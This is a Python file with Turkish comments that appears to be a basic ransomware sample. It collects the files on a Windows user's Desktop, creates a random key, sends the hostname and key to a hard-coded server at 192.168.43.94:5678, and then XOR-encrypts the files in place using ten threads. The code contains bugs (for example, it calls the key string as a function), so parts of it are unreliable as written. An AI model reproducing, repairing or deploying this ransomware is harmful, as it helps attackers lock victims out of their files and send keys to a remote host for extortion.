import os
import socket
import queue
import threading
import random

# Şifreleme fonksiyonu[threads çalıştığında]
def encrypt(key):
    file = q.get()
    print("Encrypting {}".format(file))
    try:
        key_index = 0
        max_key_index = len(key)-1
        encrypted_data = ""
        with open(file,"rb") as f:
            data = f.read()
        with open(file,"w") as f:
            f.write("")
        for byte in data:
            xor_byte = byte ^ ord(key(key_index))
            with open(file,"ab") as f:
                f.write(xor_byte.to_bytes(1,"little"))

            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
        print("{} succesfully encrypted")
    except:
        print("Failed to encrypt file!")
    q.task_done()

# socket bilgileri
IP_ADDRESS = "192.168.43.94"
PORT = 5678

# şifreleme bilgileri
ENCRYPTION_LEVEL = 512 // 8  #64 bytes
key_char_pool = "qwertyuopğasdfghjklizxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM<>!'?.,/;[]{}|"
key_char_pool_len = len(key_char_pool)

# filepathleri şifrelemek için buluyoruz
print("Preparing files...")
desktop_path = os.environ["USERPROFILE"]+"\\Desktop"
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile("{}\\{}".format(desktop_path, f)) and f != __file__[:-2]+'exe':
        abs_files.append("{}\\{}".format(desktop_path, f))
print("succesfully located all files!")

#hostname
hostname = os.getenv("COMPUTERNAME")

#Encryption key oluşturma
print("Genereting encryption key...")
key = ""
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print("Key generated!!!")

#server bağlantısı key transferi için
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print("succesfully connected... transmitting hostname and key")
    s.send("{}:{}".format(hostname,key).encode("utf-8"))
    print("finished transmitting data")
    s.close()

q = queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print("Encription and upload complate!!!")
input()
